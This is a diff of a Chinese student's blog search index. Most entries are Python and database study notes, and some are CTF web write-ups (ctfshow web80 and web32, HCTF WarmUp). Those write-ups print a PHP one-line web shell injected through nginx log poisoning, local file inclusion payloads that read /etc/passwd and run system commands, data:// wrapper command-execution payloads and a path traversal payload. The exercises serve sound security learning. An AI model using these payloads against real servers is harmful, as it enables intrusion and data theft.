-  </entry>
-  <entry>
     <title>php超全局变量</title>
     <url>/2025/01/14/php%E8%B6%85%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E7%89%B9%E6%80%A7%E6%B3%A8%E8%A7%A3/</url>
     <content><![CDATA[]]></content>
@@ -2380,6 +2413,47 @@ sum += *s - &#39;0&#39;;
       </categories>
       <tags>
         <tag>php随机数函数</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python常见bug</title>
+    <url>/2025/03/18/python%E5%B8%B8%E8%A7%81bug/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>python中对模块的引入</title>
+    <url>/2025/01/26/python%E4%B8%AD%E5%AF%B9%E6%A8%A1%E5%9D%97%E7%9A%84%E5%BC%95%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="python中对模块引入的辨析"><a href="#python中对模块引入的辨析" class="headerlink" title="python中对模块引入的辨析"></a>python中对模块引入的辨析</h1><h2 id="import-from和import的差异"><a href="#import-from和import的差异" class="headerlink" title="import..from和import的差异"></a><code>import..from</code>和<code>import</code>的差异</h2><p>首先我们要说明:</p>
+<p>依赖库里面是有很多个,模块的,我在今天学习的tomllib是自带模块的其中之一罢了:</p>
+<h3 id="from-tomllib-import-的情况"><a href="#from-tomllib-import-的情况" class="headerlink" title="from tomllib import * 的情况"></a><code>from tomllib import *</code> 的情况</h3><p>当使用 <code>from tomllib import *</code> 语句时，确实会将 <code>tomllib</code> 模块中所有定义的公共对象（函数、类、变量等）直接导入到当前 <code>.py</code> 文件的命名空间中。导入之后，在当前文件里可以直接使用这些对象，<strong>无需再加上模块名作为前缀</strong>。不过，这种导入方式存在命名<strong>冲突的风险。</strong></p>
+<p>例如，假设 <code>tomllib</code> 模块中有一个 <code>load</code> 函数，同时你的当前文件中也定义了一个名为 <code>load</code> 的函数，使用 <code>from tomllib import *</code> 导入后，<code>tomllib</code> 中的 <code>load</code> 函数可能会覆盖你自己定义的 <code>load</code> 函数，或者反之，从而导致意外的结果。示例如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 假设 tomllib 模块中有 load 函数</span></span><br><span class="line"><span class="keyword">from</span> tomllib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设当前文件中也定义了一个 load 函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This is my own load function.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里调用的 load 函数可能会产生混淆</span></span><br><span class="line">load()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="import-tomllib-的情况"><a href="#import-tomllib-的情况" class="headerlink" title="import tomllib 的情况"></a><code>import tomllib</code> 的情况</h3><p>使用 <code>import tomllib</code> 语句时，Python 会将 <code>tomllib</code> 模块加载到当前程序的命名空间中，并且创建一个指向该模块的引用。虽然不是将模块中的所有函数和对象 “复制” 到当前文件的命名空间，但实际上这些函数和对象已经被加载到内存中，<strong>只是在使用时需要通过 <code>tomllib.函数名</code> 或 <code>tomllib.对象名</code> 的方式来引用。</strong></p>
+<p>这样做的好处是可以明确指出函数或对象的来源，避免命名冲突。例如：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tomllib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里明确调用的是 tomllib 模块中的 load 函数</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;config.toml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = tomllib.load(f)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
+<li><code>from tomllib import *</code>：会将 <code>tomllib</code> 模块中的所有公共对象直接导入到当前命名空间，使用时无需加模块名前缀，但容易引发命名冲突，不建议在实际项目中大量使用。</li>
+<li><code>import tomllib</code>：将 <code>tomllib</code> 模块加载到当前程序中，通过 <code>tomllib.对象名</code> 的方式使用模块中的对象，能有效避免命名冲突，提高代码的可读性和可维护性。</li>
+</ul>
+<p>另外，还有一种折中的方式 <code>from tomllib import load</code>，这种方式只导入 <code>tomllib</code> 模块中的 <code>load</code> 函数到当前命名空间，既可以直接使用 <code>load</code> 函数，又能避免导入过多不必要的对象，减少命名冲突的可能性。</p>
+<ul>
+<li><p>除了上述的我们探讨的会引起大量冲突的情况,以下情况是对加不加前缀的最简单的解释:</p>
+<p><code>import</code>后面只要是类或者具体方法名字,由于足够具体,可不用加前缀,只要<code>import</code>后面是库或者模块,都要加前缀,因为范围太大,不管有没有<code>from</code>关键字。</p>
+<p>并且,不可以直接在<code>import</code>后面加上具体方法和类明,<code>import</code>后面只可以加库或者模块名。</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>import辨析</tag>
       </tags>
   </entry>
   <entry>
@@ -2418,42 +2492,6 @@ sum += *s - &#39;0&#39;;
       </categories>
       <tags>
         <tag>python异常</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python中对模块的引入</title>
-    <url>/2025/01/26/python%E4%B8%AD%E5%AF%B9%E6%A8%A1%E5%9D%97%E7%9A%84%E5%BC%95%E5%85%A5/</url>
-    <content><![CDATA[<h1 id="python中对模块引入的辨析"><a href="#python中对模块引入的辨析" class="headerlink" title="python中对模块引入的辨析"></a>python中对模块引入的辨析</h1><h2 id="import-from和import的差异"><a href="#import-from和import的差异" class="headerlink" title="import..from和import的差异"></a><code>import..from</code>和<code>import</code>的差异</h2><p>首先我们要说明:</p>
-<p>依赖库里面是有很多个,模块的,我在今天学习的tomllib是自带模块的其中之一罢了:</p>
-<h3 id="from-tomllib-import-的情况"><a href="#from-tomllib-import-的情况" class="headerlink" title="from tomllib import * 的情况"></a><code>from tomllib import *</code> 的情况</h3><p>当使用 <code>from tomllib import *</code> 语句时，确实会将 <code>tomllib</code> 模块中所有定义的公共对象（函数、类、变量等）直接导入到当前 <code>.py</code> 文件的命名空间中。导入之后，在当前文件里可以直接使用这些对象，<strong>无需再加上模块名作为前缀</strong>。不过，这种导入方式存在命名<strong>冲突的风险。</strong></p>
-<p>例如，假设 <code>tomllib</code> 模块中有一个 <code>load</code> 函数，同时你的当前文件中也定义了一个名为 <code>load</code> 的函数，使用 <code>from tomllib import *</code> 导入后，<code>tomllib</code> 中的 <code>load</code> 函数可能会覆盖你自己定义的 <code>load</code> 函数，或者反之，从而导致意外的结果。示例如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 假设 tomllib 模块中有 load 函数</span></span><br><span class="line"><span class="keyword">from</span> tomllib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设当前文件中也定义了一个 load 函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This is my own load function.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里调用的 load 函数可能会产生混淆</span></span><br><span class="line">load()</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="import-tomllib-的情况"><a href="#import-tomllib-的情况" class="headerlink" title="import tomllib 的情况"></a><code>import tomllib</code> 的情况</h3><p>使用 <code>import tomllib</code> 语句时，Python 会将 <code>tomllib</code> 模块加载到当前程序的命名空间中，并且创建一个指向该模块的引用。虽然不是将模块中的所有函数和对象 “复制” 到当前文件的命名空间，但实际上这些函数和对象已经被加载到内存中，<strong>只是在使用时需要通过 <code>tomllib.函数名</code> 或 <code>tomllib.对象名</code> 的方式来引用。</strong></p>
-<p>这样做的好处是可以明确指出函数或对象的来源，避免命名冲突。例如：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tomllib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里明确调用的是 tomllib 模块中的 load 函数</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;config.toml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = tomllib.load(f)</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
-<li><code>from tomllib import *</code>：会将 <code>tomllib</code> 模块中的所有公共对象直接导入到当前命名空间，使用时无需加模块名前缀，但容易引发命名冲突，不建议在实际项目中大量使用。</li>
-<li><code>import tomllib</code>：将 <code>tomllib</code> 模块加载到当前程序中，通过 <code>tomllib.对象名</code> 的方式使用模块中的对象，能有效避免命名冲突，提高代码的可读性和可维护性。</li>
-</ul>
-<p>另外，还有一种折中的方式 <code>from tomllib import load</code>，这种方式只导入 <code>tomllib</code> 模块中的 <code>load</code> 函数到当前命名空间，既可以直接使用 <code>load</code> 函数，又能避免导入过多不必要的对象，减少命名冲突的可能性。</p>
-<ul>
-<li><p>除了上述的我们探讨的会引起大量冲突的情况,以下情况是对加不加前缀的最简单的解释:</p>
-<p><code>import</code>后面只要是类或者具体方法名字,由于足够具体,可不用加前缀,只要<code>import</code>后面是库或者模块,都要加前缀,因为范围太大,不管有没有<code>from</code>关键字。</p>
-<p>并且,不可以直接在<code>import</code>后面加上具体方法和类明,<code>import</code>后面只可以加库或者模块名。</p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>python</category>
-      </categories>
-      <tags>
-        <tag>import辨析</tag>
       </tags>
   </entry>
   <entry>
@@ -2609,11 +2647,6 @@ sum += *s - &#39;0&#39;;
       </tags>
   </entry>
   <entry>
-    <title>python常见bug</title>
-    <url>/2025/03/18/python%E5%B8%B8%E8%A7%81bug/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>python读取文件</title>
     <url>/2025/01/26/python%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/</url>
     <content><![CDATA[<h1 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h1><h2 id="使用with方法读取文件"><a href="#使用with方法读取文件" class="headerlink" title="使用with方法读取文件"></a>使用with方法读取文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tomllib</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./config.toml&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = tomllib.load(f)</span><br></pre></td></tr></table></figure>
@@ -2644,6 +2677,11 @@ sum += *s - &#39;0&#39;;
       <tags>
         <tag>python读取文件</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>re库</title>
+    <url>/2025/03/01/re%E5%BA%93/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>python装饰器</title>
@@ -2684,11 +2722,6 @@ print(year2)
   <entry>
     <title>sqlite库学习</title>
     <url>/2025/03/05/sqlite%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>re库</title>
-    <url>/2025/03/01/re%E5%BA%93/</url>
     <content><![CDATA[]]></content>
   </entry>
   <entry>
@@ -2821,40 +2854,6 @@ print(year2)
       </tags>
   </entry>
   <entry>
-    <title>一句话木马简单例题web80</title>
-    <url>/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
-    <content><![CDATA[<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h4 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h4><p>这道题把协议也过滤,比如说php,data协议,所以我们可以使用一句话协议木马,比如:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
-<h4 id="木马分析："><a href="#木马分析：" class="headerlink" title="木马分析："></a>木马分析：</h4><h5 id="插入位置"><a href="#插入位置" class="headerlink" title="插入位置:"></a>插入位置:</h5><p>1.首先，我们需要知道日志的位置,日志文件根据服务器的配置不同,先要了解服务器是nginx还是apache,然后再去查看日志文件位置。<br>payloads:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/etc/passwd</span><br></pre></td></tr></table></figure>
-<p>可以发现回显<br>2.然后通过nginx日志默认路径打开日志文件:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
-<p>3.将payloads写入日志文件:<br>为什么要在UA(user-agent)中写入payloads?因为UA是浏览器的标识符,方便隐藏。<br>如图:</p>
-<img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image.png" class="" title="image">
-
-<h5 id="url中远程文件包含触发"><a href="#url中远程文件包含触发" class="headerlink" title="url中远程文件包含触发:"></a>url中远程文件包含触发:</h5><p>写入payloads:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log&amp;1=system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
-<p>先调出文件:</p>
-<img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-1.png" class="" title="image-1">
-
-<p>然后再查看日志文件:<br>写入payloads:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log&amp;1=system(&quot;cat fl0g.php&quot;);</span><br></pre></td></tr></table></figure>
-<p>嘻嘻,其实不行,要用URL编码:就是要把cat fl0g.php进行编码才可以,<br>这里存疑,为什么要用URL编码?之前system(“ls”)不用编码,为什么这里要编码?<br>应该写作：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/var/log/nginx/access.log&amp;1=system(%22cat%20fl0g.php%22)%3</span><br></pre></td></tr></table></figure>
-<p>才可以利用repeater回显:</p>
-<img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-1-1736824226811-3-1736824231038-5.png" class="" title="image-1">
-
-<p><strong>这个点还是需要解决!</strong><br>我现在传参还是优先用URL编码传参罢</p>
-]]></content>
-      <categories>
-        <category>ctfshow web</category>
-      </categories>
-      <tags>
-        <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>二级好题积累:选择题</title>
     <url>/2025/03/02/%E4%BA%8C%E7%BA%A7%E5%A5%BD%E9%A2%98%E7%A7%AF%E7%B4%AF-%E9%80%89%E6%8B%A9%E9%A2%98/</url>
     <content><![CDATA[<h1 id="二级好题集-持续更新"><a href="#二级好题集-持续更新" class="headerlink" title="二级好题集(持续更新)"></a>二级好题集(持续更新)</h1><h2 id="25-3-2"><a href="#25-3-2" class="headerlink" title="25.3.2"></a>25.3.2</h2><h3 id="关于最大元素的读取"><a href="#关于最大元素的读取" class="headerlink" title="关于最大元素的读取"></a>关于最大元素的读取</h3><img src="/2025/03/02/%E4%BA%8C%E7%BA%A7%E5%A5%BD%E9%A2%98%E7%A7%AF%E7%B4%AF-%E9%80%89%E6%8B%A9%E9%A2%98/image-20250302185105408.png" class="" title="image-20250302185105408">
@@ -2895,25 +2894,37 @@ print(year2)
       </tags>
   </entry>
   <entry>
-    <title>代码审计套路</title>
-    <url>/2025/01/14/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A5%97%E8%B7%AF/</url>
-    <content><![CDATA[<h3 id="代码审计的一些套路总结"><a href="#代码审计的一些套路总结" class="headerlink" title="代码审计的一些套路总结"></a>代码审计的一些套路总结</h3><h4 id="buuctf-HCTF-2018-WarmUp-strpos-substr截取代码"><a href="#buuctf-HCTF-2018-WarmUp-strpos-substr截取代码" class="headerlink" title="[buuctf] [HCTF 2018]WarmUp strpos&#x2F;substr截取代码"></a>[buuctf] [HCTF 2018]WarmUp strpos&#x2F;substr截取代码</h4><p>首先来看源码:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">&amp;<span class="variable">$_page</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    <title>一句话木马简单例题web80</title>
+    <url>/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
+    <content><![CDATA[<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h4><p>这道题把协议也过滤,比如说php,data协议,所以我们可以使用一句话协议木马,比如:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="木马分析："><a href="#木马分析：" class="headerlink" title="木马分析："></a>木马分析：</h4><h5 id="插入位置"><a href="#插入位置" class="headerlink" title="插入位置:"></a>插入位置:</h5><p>1.首先，我们需要知道日志的位置,日志文件根据服务器的配置不同,先要了解服务器是nginx还是apache,然后再去查看日志文件位置。<br>payloads:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/etc/passwd</span><br></pre></td></tr></table></figure>
+<p>可以发现回显<br>2.然后通过nginx日志默认路径打开日志文件:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+<p>3.将payloads写入日志文件:<br>为什么要在UA(user-agent)中写入payloads?因为UA是浏览器的标识符,方便隐藏。<br>如图:</p>
+<img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image.png" class="" title="image">
 
-<p><strong>特别注意的点就是:</strong><br>这里substr截取代码时的第三个参数是截取代码的长度,第二个参数是开始的长度<br>而巧妙之处就在于:</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;?&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>这段代码将page手动加了一个?然后探测?的位置,而在主流编程语言中,字符串位置的参数都是从0开始的,例如我要探测:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mmk&amp;nina?</span><br></pre></td></tr></table></figure>
-<p>这里?的位置在参数8的位置,而截取的时候,长度是8,所以刚好把?前面的截取走了,并没有包含?<br>这里就可以解释为什么buuctf那道题的payloads为:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=hint.php?/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-<p>为什么本应是..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg,还在前面多加了一个&#x2F;,因为函数把?前面的字符全部截取走了,只剩下?和前面多加的&#x2F;以及后面的路径: ..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag,这里的&#x2F;是include的分割符号</p>
-<p><strong>详细见[HCTF 2018]WarmUp1</strong>的wp。</p>
+<h5 id="url中远程文件包含触发"><a href="#url中远程文件包含触发" class="headerlink" title="url中远程文件包含触发:"></a>url中远程文件包含触发:</h5><p>写入payloads:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log&amp;1=system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
+<p>先调出文件:</p>
+<img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-1.png" class="" title="image-1">
+
+<p>然后再查看日志文件:<br>写入payloads:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log&amp;1=system(&quot;cat fl0g.php&quot;);</span><br></pre></td></tr></table></figure>
+<p>嘻嘻,其实不行,要用URL编码:就是要把cat fl0g.php进行编码才可以,<br>这里存疑,为什么要用URL编码?之前system(“ls”)不用编码,为什么这里要编码?<br>应该写作：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=/var/log/nginx/access.log&amp;1=system(%22cat%20fl0g.php%22)%3</span><br></pre></td></tr></table></figure>
+<p>才可以利用repeater回显:</p>
+<img src="/2025/01/13/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/image-1-1736824226811-3-1736824231038-5.png" class="" title="image-1">
+
+<p><strong>这个点还是需要解决!</strong><br>我现在传参还是优先用URL编码传参罢</p>
 ]]></content>
       <categories>
-        <category>web安全</category>
+        <category>ctfshow web</category>
       </categories>
       <tags>
-        <tag>代码审计</tag>
+        <tag>文件包含</tag>
       </tags>
   </entry>
   <entry>
@@ -2999,7 +3010,7 @@ print(year2)
 <li><strong>定义</strong>：关系模式中的每个属性都不可再分，即属性是原子的。并且主属性（主键）不能为空且不重复 。例如学生选课关系模式中，每个属性如 “学号”“课程号” 等都不能再拆分成更小的子属性 ，这是关系型数据库最基本要求。</li>
 <li>比如:</li>
 </ul>
-<style>.tgbjzbgnxypx{zoom:50%;}</style><img src="/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/image-20250324145245672.png" class="tgbjzbgnxypx" alt="image-20250324145245672">
+<style>.nuythdhwnqrx{zoom:50%;}</style><img src="/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/image-20250324145245672.png" class="nuythdhwnqrx" alt="image-20250324145245672">
 
 <ul>
 <li>这里的歌手一列含有两个元素，不符合原子化的规范。比如学习成绩，这一栏就会有如:<code>&#123;&quot;英语&quot;:100,&quot;数学&quot;:100&#125;</code>的情况，这一栏就不符合原子化的原则，即不为1NF的规则。</li>
@@ -3019,9 +3030,9 @@ print(year2)
 <li>基本介绍</li>
 <li>**定义：**第三范式（3NF）要求关系模式在满足第二范式（2NF）的基础上，不存在非主属性对主键的传递函数依赖 。</li>
 <li>举例：</li>
-<li><style>.lsmsirfrtbtx{zoom: 25%;}</style><img src="/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/image-20250324153727673.png" class="lsmsirfrtbtx" alt="image-20250324153727673"></li>
+<li><style>.ngudvbhqhvrn{zoom: 25%;}</style><img src="/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/image-20250324153727673.png" class="ngudvbhqhvrn" alt="image-20250324153727673"></li>
 <li>相当于横向有依赖。其解决方法也是把表拆开。</li>
-<li><style>.pocxmnelhfkn{zoom: 25%;}</style><img src="/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/image-20250324153908868.png" class="pocxmnelhfkn" alt="image-20250324153908868"></li>
+<li><style>.wvyykbohovri{zoom: 25%;}</style><img src="/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/image-20250324153908868.png" class="wvyykbohovri" alt="image-20250324153908868"></li>
 <li>解决方法如图所示。</li>
 </ul>
 <h3 id="BCNF"><a href="#BCNF" class="headerlink" title="BCNF"></a>BCNF</h3><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a>例题一</h3><img src="/2025/03/19/%E4%BA%8C%E7%BA%A7%E9%80%9A%E8%AF%86/image-20250324154755016.png" class="" title="image-20250324154755016">
@@ -3077,20 +3088,25 @@ print(year2)
       </tags>
   </entry>
   <entry>
-    <title>命令执行:使用文件包含绕过</title>
-    <url>/2025/01/13/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87/</url>
-    <content><![CDATA[<h3 id="ctfshow-web32"><a href="#ctfshow-web32" class="headerlink" title="ctfshow web32"></a>ctfshow web32</h3><h4 id="读题和简单分析"><a href="#读题和简单分析" class="headerlink" title="读题和简单分析:"></a>读题和简单分析:</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里很简单明确:就是把shell flag php 这些关键词全部过滤了,主要是连后引号都过滤了,就不可以使用常规的命令执行了.</p>
-<h4 id="文件包含方法"><a href="#文件包含方法" class="headerlink" title="文件包含方法:"></a>文件包含方法:</h4><p>先说payloads:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“ls”);?&gt;</span><br><span class="line">/?c=include$_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(“cat flag.php”);?&gt;</span><br></pre></td></tr></table></figure>
-<h5 id="分割符"><a href="#分割符" class="headerlink" title="分割符"></a>分割符</h5><p><strong>&amp;:</strong><br>这里就把这个指令分成了两部分:<br>前面一部分赋值给超全局变量$_GET[‘c’],后面一部分就是另外一段包含代码的对象,并不会赋值给前面的c变量.这两段是完全分开的。<br><strong>?&gt;绕过(这是我的易错点):</strong><br>有个这样的机制:<br>php默认的机制,php中的?&gt;符号前面的字符会自带分号,就绕过了分号”;”,十分巧妙.</p>
